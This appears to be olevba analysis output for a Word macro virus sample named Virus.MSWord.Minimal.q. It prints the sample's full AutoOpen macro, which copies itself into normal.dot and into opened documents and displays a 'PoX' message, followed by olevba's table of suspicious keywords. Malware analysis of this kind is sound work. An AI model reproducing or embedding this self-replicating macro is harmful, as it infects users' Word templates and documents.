olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.q-e7d21aed4975512cf54b5c230d04f1aad1e573af
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.q-e7d21aed4975512cf54b5c230d04f1aad1e573af - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.q-e7d21aed4975512cf54b5c230d04f1aad1e573af - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim N$
Dim Msg$
Rem AutoOpen Macro
Dim wiz As Object: Set wiz = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs wiz

On Error GoTo -1: On Error GoTo PoX
If wiz.Format = 0 Then
wiz.Format = 1
N$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "normal.dot:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 3
WordBasic.FileSaveAs wiz
End If

WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "normal.dot:AutoOpen", 3
Msg$ = Msg$ + " May a PoX be upon you "
WordBasic.MsgBox Msg$, "            POXARAMA"
WordBasic.Beep 32
PoX:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

